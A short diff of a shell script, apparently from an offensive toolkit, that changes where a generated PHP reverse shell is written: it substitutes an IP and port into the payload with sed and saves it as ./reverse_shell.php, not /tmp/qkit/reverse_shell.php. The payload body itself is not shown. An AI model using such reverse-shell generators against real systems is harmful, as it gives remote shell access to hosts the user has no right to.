@@ -202,12 +202,11 @@ function printit ($string) {
 EOF
 )
 
-  echo "$php_script" | sed s/x.x.x.x/"${IP}"/g | sed s/yyyy/"${PORT}"/g > /tmp/qkit/reverse_shell.php
-
+  echo "$php_script" | sed s/x.x.x.x/"${IP}"/g | sed s/yyyy/"${PORT}"/g > ./reverse_shell.php && \
   gum style \
 	--foreground 212 --border-foreground 212 --border double \
 	--align center --width 50 --margin "1 2" --padding "2 4" \
-	'/tmp/qkit/reverse_shell.php'
+	'./reverse_shell.php'
 }
 
 # Python
